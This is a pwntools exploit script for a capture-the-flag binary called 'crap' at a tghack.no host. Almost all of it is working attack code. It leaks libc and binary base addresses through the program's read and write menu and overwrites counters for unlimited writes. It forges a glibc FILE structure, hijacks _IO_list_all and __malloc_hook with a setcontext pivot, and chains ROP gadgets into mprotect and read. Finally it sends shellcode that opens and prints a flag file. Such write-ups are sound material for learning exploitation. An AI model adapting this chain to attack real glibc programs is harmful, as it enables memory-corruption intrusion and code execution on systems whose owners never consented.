#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 60001 ./crap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./crap')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'crap.tghack.no'
port = int(args.PORT or 6001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

def menu(idx):
    io.sendlineafter("> ", str(idx))

def read(addr):
    menu(1)
    io.sendlineafter("addr: ", hex(addr))
    io.recvuntil("value: ")
    return io.recvline()[:-1]

def leak(addr):
    return int(read(addr), 16)

def write(addr, value):
    menu(2)
    io.sendlineafter("addr/value: ", "{:#x} {:#x}".format(addr, value))

def leave_feedback(feedback, keep=False):
    menu(3)
    io.sendlineafter("feedback: ", feedback)
    io.recvuntil("(y/n)\n")
    if keep:
        io.sendline("y")
    else:
        io.sendline("n")

def view_feedback():
    menu(4)
    io.recvuntil("feedback: ")
    return io.recvline()[:-1]

leave_feedback("lol")
libc_leak = u64(view_feedback().ljust(8, "\x00"))
log.info("libc leak: {:#x}".format(libc_leak))

libc = ELF("../uploads/libc-2.31.so")
libc.address = libc_leak - 0x3b5be0
log.success("libc base: {:#x}".format(libc.address))

_dl_rtld_libname = libc.address + 0x82b050
log.info("_dl_rtld_libname: {:#x}".format(_dl_rtld_libname))

binary_leak = leak(_dl_rtld_libname)
log.info("binary leak: {:#x}".format(binary_leak))
exe.address = binary_leak - 0x238
log.success("binary base: {:#x}".format(exe.address))

# overwrite {read,write}_count to get infinite reads and writes
read_count = exe.symbols["read_count"]
write(read_count, 0xfefefefefefefefe)

stack_leak = leak(libc.symbols["environ"])
log.info("stack: {:#x}".format(stack_leak))

stdin = leak(exe.got["stdin"])
log.info("stdin: {:#x}".format(stdin))

# A handy function to craft FILE structures
# from here: https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
# slightly modified
def pack_file(_flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0,
        _vtable_offset = 0,
        _vtable = 0):
    struct = p32(_flags) + \
            p32(0x00) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    struct = struct.ljust(0x78, "\x00")
    #struct += p64(0xffffffff)
    struct += p64(_vtable_offset)
    struct += p64(0x00)
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    struct += p64(_vtable)
    return struct

# malloc_hook should point to the pivot gadget
scratch = exe.address + 0x202100
log.info("scratch: {:#x}".format(scratch))
rdi = scratch
rop_stack = scratch+0x300
fake_file = pack_file(_IO_buf_base = 0x00,
					  _IO_buf_end = rop_stack - 0x10, #(rdi - 100) / 2,
					  _IO_write_ptr = rop_stack, #(rdi - 100) / 2 + 0x100,
					  _IO_write_base = 0,
                      _lock = libc.symbols["__free_hook"], # has to point to NULL
                      _vtable = libc.symbols["_IO_file_jumps"] + 0xc0)

def write_data(addr, data):
    for i in range(0, len(data), 8):
        tmp = data[i:]
        if len(tmp) > 8:
            tmp = tmp[:8]
        elif len(tmp) < 8:
            tmp = tmp.ljust(8, "\x00")
        assert len(tmp) == 8
        #log.info("write {:#x} -> {:#x}".format(addr + i, u64(tmp)))
        write(addr + i, u64(tmp))

write_data(scratch, fake_file)


# setcontext gadget
"""
.text:0000000000045BB5                 mov     rsp, [rdx+0A0h]
.text:0000000000045BBC                 mov     rbx, [rdx+80h]
.text:0000000000045BC3                 mov     rbp, [rdx+78h]
.text:0000000000045BC7                 mov     r12, [rdx+48h]
.text:0000000000045BCB                 mov     r13, [rdx+50h]
.text:0000000000045BCF                 mov     r14, [rdx+58h]
.text:0000000000045BD3                 mov     r15, [rdx+60h]
.text:0000000000045BD7                 mov     rcx, [rdx+0A8h]
.text:0000000000045BDE                 push    rcx
.text:0000000000045BDF                 mov     rsi, [rdx+70h]
.text:0000000000045BE3                 mov     rdi, [rdx+68h]
.text:0000000000045BE7                 mov     rcx, [rdx+98h]
.text:0000000000045BEE                 mov     r8, [rdx+28h]
.text:0000000000045BF2                 mov     r9, [rdx+30h]
.text:0000000000045BF6                 mov     rdx, [rdx+88h]
.text:0000000000045BF6 ; } // starts at 45B80
.text:0000000000045BFD ; __unwind {
.text:0000000000045BFD                 xor     eax, eax
.text:0000000000045BFF                 retn
"""
pivot = libc.address + 0x0000000000045BA5
log.info("pivot at {:#x}".format(pivot))
# overwrite malloc_hook
write(libc.symbols["__malloc_hook"], pivot)

# change _IO_list_all to point to our fake FILE
write(libc.symbols["_IO_list_all"], scratch)

pop_rsp = libc.address + 0x39d4
new_rsp = rop_stack + 0x100
write(rop_stack + 0xa0, new_rsp)
write(rop_stack + 0xa8, pop_rsp)
stack = rop_stack + 0x120
write(stack - 0x20 + 0, stack)

# place the shellcode somewhere on the stack
sc_addr = stack_leak & ~0xfff

# 0x0000000000021882 : pop rdi ; ret
# 0x0000000000022192 : pop rsi ; ret
# 0x0000000000001b9a : pop rdx ; ret
pop_rdi = libc.address + 0x0000000000021882 
pop_rsi = libc.address + 0x0000000000022192 
pop_rdx = libc.address + 0x0000000000001b9a 

context.arch="amd64"
sc = asm("""
mov rax, SYS_close
mov rdi, 0
syscall

mov rax, SYS_open
lea rdi, [rip+lol]
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
xor rax, rax
lea rsi, [rip+lol]
mov rdx, 0x100
syscall

mov rdi, SYS_write
lea rsi, [rip+lol]
mov rdx, rax
mov rax, 1
syscall

mov rdi, 0x00
mov rax, SYS_exit_group
syscall
lol:
""", shared=True) + "/home/crap/flag.txt\x00"

# mprotect(sc_addr, 0x1000, 7)
write(stack + (8 * 0), pop_rdi)
write(stack + (8 * 1), sc_addr)
write(stack + (8 * 2), pop_rsi)
write(stack + (8 * 3), 0x1000)
write(stack + (8 * 4), pop_rdx)
write(stack + (8 * 5), 7)
write(stack + (8 * 6), libc.symbols["mprotect"])

# read(0, sc_addr, len(sc))
write(stack + (8 * 7), pop_rdi)
write(stack + (8 * 8), 0)
write(stack + (8 * 9), pop_rsi)
write(stack + (8 * 10), sc_addr)
write(stack + (8 * 11), pop_rdx)
write(stack + (8 * 12), len(sc))
write(stack + (8 * 13), libc.symbols["read"])
write(stack + (8 * 14), sc_addr)

# exit to trigger IO cleanup
io.sendline("5")

time.sleep(0.5)
time.sleep(0.5)
io.send(sc)

io.interactive()
